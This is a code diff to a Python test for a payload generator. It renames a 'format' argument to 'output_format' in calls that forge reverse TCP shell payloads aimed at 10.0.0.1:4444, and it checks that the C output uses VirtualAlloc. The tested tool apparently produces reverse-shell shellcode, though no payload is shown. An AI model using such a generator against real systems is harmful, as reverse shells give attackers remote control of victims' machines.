@@ -209,13 +209,13 @@ def test_weapon_foundry_raw_and_c_formats() -> None:
 
     raw = foundry.forge(
         shell_type=ShellType.REVERSE_TCP, lhost="10.0.0.1", lport=4444,
-        encryption=EncryptionMethod.NONE, format=PayloadFormat.RAW,
+        encryption=EncryptionMethod.NONE, output_format=PayloadFormat.RAW,
     )
     assert len(raw.payload) > 0, "RAW format should produce payload bytes"
 
     c_payload = foundry.forge(
         shell_type=ShellType.REVERSE_TCP, lhost="10.0.0.1", lport=4444,
-        encryption=EncryptionMethod.NONE, format=PayloadFormat.C,
+        encryption=EncryptionMethod.NONE, output_format=PayloadFormat.C,
     )
     payload_text = c_payload.payload.decode("utf-8", errors="replace")
     assert "VirtualAlloc" in payload_text, "C format should contain VirtualAlloc"
